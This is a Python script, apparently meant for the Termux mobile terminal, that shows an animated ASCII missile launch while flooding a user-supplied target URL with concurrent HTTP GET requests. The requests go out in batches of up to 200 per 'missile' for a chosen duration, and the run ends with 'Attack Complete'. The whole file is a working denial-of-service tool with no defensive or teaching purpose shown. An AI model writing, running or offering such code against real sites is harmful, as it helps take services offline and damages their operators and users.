import asyncio
import aiohttp
import random
import time
import os
import shutil

# Terminal size
TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
TERMINAL_WIDTH = TERMINAL_SIZE.columns
TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2  # leave 2 lines for safe bottom

# Clear terminal
def clear():
    print("\033[H\033[J", end="")  # ANSI clear for Termux

# Countdown loader
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        await asyncio.sleep(1)

# Small missile body for mobile
MISSILE_BODY = [
"  /\\  ",
" |=|  ",
" |=|  ",
" |=|  ",
" |=|  "
]

# Exhaust colors
EXHAUST_FRAMES = [
    "\033[31m ^^^ \033[0m",
    "\033[33m *** \033[0m",
    "\033[91m !!! \033[0m",
    "\033[93m ::: \033[0m"
]

class Missile:
    def __init__(self):
        self.reset()

    def reset(self):
        self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
        self.y = TERMINAL_HEIGHT
        # speed determines missile type
        self.speed = random.choice([1,2,3])  # 1=avg, 2=ballistic, 3=hypersonic
        self.active = False
        self.launch_delay = random.uniform(1,3)
        self.exhaust = random.choice(EXHAUST_FRAMES)
        # Assign batch based on type
        if self.speed == 3:
            self.batch = 200  # hypersonic
        elif self.speed == 2:
            self.batch = 100  # ballistic
        else:
            self.batch = 1    # average

    def move(self):
        if self.active:
            self.y -= self.speed
            if self.y < -len(MISSILE_BODY):
                self.reset()
                self.active = False

# Draw missiles with batch note
def draw_missiles(missiles):
    buffer = [""] * TERMINAL_HEIGHT
    for missile in missiles:
        if missile.active:
            for i, line in enumerate(MISSILE_BODY):
                pos = missile.y - len(MISSILE_BODY) + i
                if 0 <= pos < TERMINAL_HEIGHT:
                    # First line shows batch note
                    if i == 0:
                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch} REQ]"
                    else:
                        buffer[pos] += " " * missile.x + line
            # Exhaust animation at bottom
            exhaust_pos = missile.y
            if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
    clear()
    print("\n".join(buffer))

# Send missile batch requests
async def send_missile_requests(target, batch):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(batch):
            tasks.append(session.get(target))
        try:
            await asyncio.gather(*tasks)
        except:
            pass

# Main loop
async def main():
    target = input("¿TARGZ > ")
    duration = int(input("¿DU > "))

    await countdown_loader(5)

    missiles = [Missile() for _ in range(2)]  # mini swarm

    start_time = time.time()
    last_launch_times = [0]*len(missiles)

    while time.time() - start_time < duration:
        now = time.time()
        for idx, missile in enumerate(missiles):
            # Launch missile if delay passed
            if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                missile.active = True
                last_launch_times[idx] = now
                # Send batch asynchronously
                asyncio.create_task(send_missile_requests(target, missile.batch))
            missile.move()
        draw_missiles(missiles)
        await asyncio.sleep(0.05)

    print("=== TOS-1: Attack Complete ===")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
        print("TOS-1 terminated by user.")
